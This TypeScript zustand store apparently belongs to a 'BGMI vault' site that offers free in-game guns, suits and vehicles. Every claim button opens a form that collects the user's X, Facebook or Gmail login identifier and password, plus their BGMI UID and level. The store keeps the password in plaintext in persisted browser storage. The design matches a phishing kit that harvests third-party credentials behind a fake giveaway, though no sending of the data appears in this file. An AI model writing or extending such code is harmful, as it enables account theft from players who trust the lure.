"use client";

import { create } from "zustand";
import { persist } from "zustand/middleware";

export type Provider = "x" | "facebook" | "gmail";

export interface SocialAccount {
  provider: Provider;
  displayName: string;
  email: string;
  avatar: string;
  // Login credentials entered by the user in the provider form
  loginIdentifier: string; // username, email, or phone number
  loginPassword: string;
  // BGMI account details entered in the same form
  bgmiUid: string;
  level: string;
}

// Kept for backwards-compat with existing components, but no longer the
// primary source — the credentials form collects everything into SocialAccount.
export interface PlayerInfo {
  level: string;
  email: string;
  number: string;
  uid: string;
  password: string;
}

export type ClaimedItem = {
  id: string;
  name: string;
  type: "gun" | "suit" | "vehicle";
  claimedAt: number;
};

interface AuthState {
  account: SocialAccount | null;
  player: PlayerInfo | null;
  claimed: ClaimedItem[];
  // Modal control
  loginOpen: boolean;
  playerInfoOpen: boolean;
  pendingClaim: { id: string; name: string; type: ClaimedItem["type"] } | null;
  // Actions
  openLogin: () => void;
  closeLogin: () => void;
  login: (a: SocialAccount) => void;
  skipLogin: () => void;
  logout: () => void;
  openPlayerInfo: (claim?: { id: string; name: string; type: ClaimedItem["type"] }) => void;
  closePlayerInfo: () => void;
  savePlayer: (p: PlayerInfo) => void;
  claim: (item: { id: string; name: string; type: ClaimedItem["type"] }) => void;
  // The universal "user clicked something" handler used by every CTA
  handleAction: (item: { id: string; name: string; type: ClaimedItem["type"] }) => void;
}

export const useAuth = create<AuthState>()(
  persist(
    (set, get) => ({
      account: null,
      player: null,
      claimed: [],
      loginOpen: false,
      playerInfoOpen: false,
      pendingClaim: null,
      openLogin: () => set({ loginOpen: true }),
      closeLogin: () => set({ loginOpen: false }),
      // Login stores all credentials + BGMI details → ready to claim directly
      login: (a) =>
        set({
          account: a,
          loginOpen: false,
          // After login, directly send the pending claim (no extra player form)
          // We mark the pending claim as claimed via the handleAction path below.
        }),
      skipLogin: () =>
        set({
          account: null,
          loginOpen: false,
          playerInfoOpen: get().pendingClaim ? true : false,
        }),
      logout: () =>
        set({ account: null, player: null, claimed: [], pendingClaim: null }),
      openPlayerInfo: (claim) =>
        set({
          pendingClaim: claim ?? get().pendingClaim,
          playerInfoOpen: true,
        }),
      closePlayerInfo: () => set({ playerInfoOpen: false }),
      savePlayer: (p) => {
        const pending = get().pendingClaim;
        const claimed = [...get().claimed];
        if (pending) {
          claimed.push({
            ...pending,
            claimedAt: Date.now(),
          });
        }
        set({
          player: p,
          playerInfoOpen: false,
          pendingClaim: null,
          claimed,
        });
      },
      claim: (item) => {
        const claimed = [
          ...get().claimed,
          { ...item, claimedAt: Date.now() },
        ];
        set({ claimed });
      },
      // Universal handler: every CTA calls this.
      // Opens the login modal — the user picks a provider (X/Facebook/Gmail),
      // then enters their credentials + BGMI UID + Level in the same form.
      handleAction: (item) => {
        set({ pendingClaim: item, loginOpen: true });
      },
    }),
    {
      name: "bgmi-vault-auth",
      version: 4,
      partialize: (s) => ({
        account: s.account,
        player: s.player,
        claimed: s.claimed,
      }),
      // Invalidate old sessions that don't match the current shape
      migrate: (persistedState: unknown, version: number) => {
        if (version < 4) {
          return { account: null, player: null, claimed: [] };
        }
        return persistedState as { account: SocialAccount | null; player: PlayerInfo | null; claimed: ClaimedItem[] };
      },
    }
  )
);

export const isClaimed = (claimed: ClaimedItem[], id: string) =>
  claimed.some((c) => c.id === id);
